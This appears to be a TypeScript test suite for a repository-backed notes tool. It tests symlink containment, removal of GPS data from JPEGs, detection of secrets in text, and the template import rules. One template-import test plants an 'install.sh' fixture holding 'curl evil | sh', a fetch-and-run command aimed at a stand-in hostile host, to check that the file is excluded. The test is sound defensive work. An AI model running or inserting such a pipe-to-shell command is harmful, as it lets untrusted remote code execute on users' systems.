import "./helpers.ts";
import assert from "node:assert/strict";
import fs from "node:fs";
import path from "node:path";
import { test } from "node:test";
import { findSensitive, removeJpegLocation } from "../src/core/privacy.ts";
import { GitRoll } from "../src/node/repo.ts";
import { tmp } from "./helpers.ts";

test("attachment lookup ignores symbolic links that point outside the Roll", () => {
  const roll = GitRoll.init(tmp());
  const outside = path.join(tmp(), "secret.txt");
  fs.writeFileSync(outside, "not part of the Roll");
  const hex = "a".repeat(64);
  fs.symlinkSync(outside, path.join(roll.root, "attachments", `${hex}.txt`));

  assert.equal(roll.attachmentFile(`sha256:${hex}`), null);
  assert.ok(roll.check().some((p) => /symbolic link/.test(p.error)), "the validator reports the link");
});

test("writes refuse to follow a linked folder out of the Roll", () => {
  const roll = GitRoll.init(tmp());
  const outside = tmp();
  fs.mkdirSync(path.join(roll.root, "entries"), { recursive: true });
  fs.symlinkSync(outside, path.join(roll.root, "entries", String(new Date().getFullYear())));

  assert.throws(() => roll.addEntry({ text: "Should not escape" }), /symbolic links/);
  assert.deepEqual(fs.readdirSync(outside), [], "nothing was written outside");
});

test("a linked events folder is reported, not read", () => {
  const roll = GitRoll.init(tmp());
  const outside = tmp();
  fs.writeFileSync(path.join(outside, "x.md"), "---\nid: x\ncreated: 2026-01-01T00:00:00Z\n---\nhi\n");
  fs.rmSync(path.join(roll.root, "entries"), { recursive: true });
  fs.symlinkSync(outside, path.join(roll.root, "entries"));
  const { entries, problems } = roll.load();
  assert.equal(entries.length, 0);
  assert.ok(problems.some((p) => /symbolic link/.test(p.error)));
});

function jpegWithGps(): Buffer {
  const tiff = Buffer.alloc(68);
  tiff.write("II", 0, "ascii");
  tiff.writeUInt16LE(42, 2);
  tiff.writeUInt32LE(8, 4);
  tiff.writeUInt16LE(1, 8); // IFD0: one entry
  tiff.writeUInt16LE(0x8825, 10); // GPSInfo pointer
  tiff.writeUInt16LE(4, 12);
  tiff.writeUInt32LE(1, 14);
  tiff.writeUInt32LE(26, 18);
  tiff.writeUInt16LE(1, 26); // GPS IFD: one entry
  tiff.writeUInt16LE(2, 28); // GPSLatitude
  tiff.writeUInt16LE(5, 30); // RATIONAL
  tiff.writeUInt32LE(3, 32);
  tiff.writeUInt32LE(44, 36);
  tiff.fill(0x47, 44, 68); // the coordinates
  const exif = Buffer.concat([Buffer.from("Exif\0\0", "binary"), tiff]);
  const header = Buffer.alloc(4);
  header.writeUInt16BE(0xffe1, 0);
  header.writeUInt16BE(exif.length + 2, 2);
  return Buffer.concat([Buffer.from([0xff, 0xd8]), header, exif, Buffer.from([0xff, 0xda, 0x00, 0x02, 0x11, 0x22, 0xff, 0xd9])]);
}

test("photos are saved without GPS location", () => {
  const original = jpegWithGps();
  const { bytes, removed } = removeJpegLocation(original);
  assert.equal(removed, true);
  assert.equal(bytes.length, original.length);
  assert.ok(!Buffer.from(bytes).includes(Buffer.alloc(24, 0x47)));

  const roll = GitRoll.init(tmp());
  const { entry, notices } = roll.save({ text: "Front door" }, [{ name: "door.jpg", type: "image/jpeg", data: original }]);
  assert.match(notices.join(" "), /Removed location data from door\.jpg/);
  const stored = fs.readFileSync(roll.attachmentFile(entry.attachments[0].hash)!);
  assert.ok(!stored.includes(Buffer.alloc(24, 0x47)), "stored photo has no coordinates");
  assert.deepEqual(roll.check(), []);

  fs.appendFileSync(path.join(roll.root, ".gitroll/config.yaml"), "attachments:\n  remove_location: false\n");
  const kept = roll.save({ text: "Keep location" }, [{ name: "kept.jpg", type: "image/jpeg", data: original }]);
  assert.ok(fs.readFileSync(roll.attachmentFile(kept.entry.attachments[0].hash)!).includes(Buffer.alloc(24, 0x47)));
});

test("sensitive text is spotted before it goes into history", () => {
  assert.deepEqual(findSensitive("Replaced the capacitor, $325"), []);
  assert.deepEqual(findSensitive("wifi password: correcthorse"), ["password"]);
  assert.ok(findSensitive("card 4111 1111 1111 1111 exp 09/29").includes("card number"));
  assert.ok(findSensitive("token ghp_abcdefghijklmnopqrstuvwxyz0123456789AB").includes("GitHub token"));
  assert.ok(findSensitive("-----BEGIN OPENSSH PRIVATE KEY-----").includes("private key"));

  const roll = GitRoll.init(tmp());
  const { notices } = roll.save({ text: "Garage PIN is 4821" });
  assert.match(notices.join(" "), /password/);
  assert.equal(roll.sensitive().length, 1);
});

test("templates only contribute Roll data, never code or workflows", () => {
  const template = tmp();
  fs.mkdirSync(path.join(template, ".gitroll/types"), { recursive: true });
  fs.mkdirSync(path.join(template, ".github/workflows"), { recursive: true });
  fs.mkdirSync(path.join(template, "projects"), { recursive: true });
  fs.writeFileSync(path.join(template, ".gitroll/types/vehicle.yaml"), "label: Vehicle\nfields:\n  - key: odometer\n    kind: number\n");
  fs.writeFileSync(path.join(template, ".gitroll/theme.css"), ":root { --accent: #0f766e; }\n");
  fs.writeFileSync(path.join(template, "projects/car.yaml"), "name: Car\n");
  fs.writeFileSync(path.join(template, ".github/workflows/steal.yml"), "on: push\n");
  fs.writeFileSync(path.join(template, "install.sh"), "curl evil | sh\n");

  const roll = GitRoll.init(tmp(), { name: "From template", template });
  assert.ok(fs.existsSync(path.join(roll.root, ".gitroll/types/vehicle.yaml")));
  assert.ok(fs.existsSync(path.join(roll.root, ".gitroll/theme.css")));
  assert.equal(roll.projects()[0].name, "Car");
  assert.ok(!fs.existsSync(path.join(roll.root, ".github")));
  assert.ok(!fs.existsSync(path.join(roll.root, "install.sh")));
  assert.equal(roll.config().name, "From template");
  assert.deepEqual(roll.check(), []);
});
